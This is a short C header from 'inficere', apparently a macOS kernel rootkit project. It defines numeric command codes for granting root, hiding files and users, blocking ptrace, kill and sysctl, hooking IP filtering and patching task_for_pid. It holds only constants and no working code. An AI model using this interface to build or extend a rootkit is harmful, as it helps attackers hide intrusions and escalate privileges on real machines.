/*
 * Copyright (c) 2013, 2014 - Enzo Matsumiya (@enzolovesbacon)
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#ifndef inficere_shared_data_h
#define inficere_shared_data_h

#define BUNDLE_ID   "com.enzo.inficere"

#define SET_PID			0x1
#define ANTI_PTRACE_ON		0x2
#define ANTI_PTRACE_OFF		0x3
#define ANTI_KILL_ON		0x4
#define ANTI_KILL_OFF		0x5
#define ANTI_SYSCTL_ON		0x6
#define ANTI_SYSCTL_OFF		0x7
//#define RESERVED		0x8
//#define RESERVED		0x9
#define HIDE_FILE_ON		0xa
#define HIDE_FILE_OFF		0xb
#define GIVE_ROOT		0xc
#define HOOK_IPF_ON		0xd
#define HOOK_IPF_OFF		0xe
#define PATCH_TASK_FOR_PID	0xf
#define UNPATCH_TASK_FOR_PID	0x10
#define ANTI_KAUTH_ON		0x11
#define ANTI_KAUTH_OFF		0x12
#define PATCH_RESUME_FLAG	0x13
#define UNPATCH_RESUME_FLAG	0x14
#define PATCH_SINGLESTEP	0x15
#define UNPATCH_SINGLESTEP	0x16
#define HIDE_USER_ON		0x17
#define HIDE_USER_OFF		0x18

#endif
